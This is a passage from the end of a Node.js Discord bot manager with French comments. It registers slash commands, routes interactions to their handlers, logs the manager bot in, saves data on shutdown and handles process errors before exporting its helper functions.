                try {
                    const rest = new REST({ version: '10' }).setToken(config.discord.bot_token);
                    const slashCommands = [];
                    
                    globalCommandsMap.forEach(cmd => {
                        if (cmd.slash) {
                            const builder = new SlashCommandBuilder()
                                .setName(cmd.name)
                                .setDescription(cmd.description);
                            
                            if (cmd.options) {
                                cmd.options.forEach(opt => {
                                    if (opt.type === 'string') {
                                        builder.addStringOption(s => s.setName(opt.name).setDescription(opt.description).setRequired(opt.required));
                                    }
                                });
                            }
                            slashCommands.push(builder.toJSON());
                        }
                    });

                    if (slashCommands.length > 0) {
                        await rest.put(
                            Routes.applicationCommands(config.discord.client_id || managerBot.user.id),
                            { body: slashCommands }
                        );
                        console.log('Slash commands enregistrées avec succès');
                    }
                } catch (err) {
                    console.error('Erreur enregistrement slash commands:', err);
                }
            });

            managerBot.on('interactionCreate', async (interaction) => {
                if (!interaction.isChatInputCommand()) return;

                const command = globalCommandsMap.get(interaction.commandName);
                if (command && command.runSlash) {
                    try {
                        await command.runSlash(managerBot, interaction, {
                            users,
                            config,
                            globalDb,
                            dbManager,
                            clients,
                            initializeSingleClient,
                            verifyTokenBeforeConnect
                        });
                    } catch (err) {
                        console.error(`Erreur exécution slash command ${interaction.commandName}:`, err);
                    }
                }
            });

            await managerBot.login(config.discord.bot_token);
        } else {
            console.log('Manager Bot non configuré (token manquant)');
        }
        
        startClientRotationSchedule(); 
        
    } catch (error) {
        console.error('❌ Erreur initialisation principale:', error);
        await gracefulShutdown();
    }
}

process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);

process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ Unhandled Rejection:');
    console.error(reason);
});

process.on('uncaughtException', async (error) => {
    console.error('💥 Erreur critique:');
    console.error(error);
    
    try {
        await saveGlobalDb();
        await saveConfig();
    } catch (e) {
        console.error('❌ Sauvegarde d\'urgence échouée:', e);
    }
    
    await gracefulShutdown();
});

main();

module.exports = { 
    dbManager, 
    globalDb, 
    config,
    clients,
    users,
    getClients: () => clients,
    getConfig: () => config,
    createNewClient,
    initializeSingleClient,
    rotateClientConnection,
    attachSnipeEvent,
    loadCommands,
    saveConfig,
    cleanupAllClients,
    eventCache,
    connectionState
};
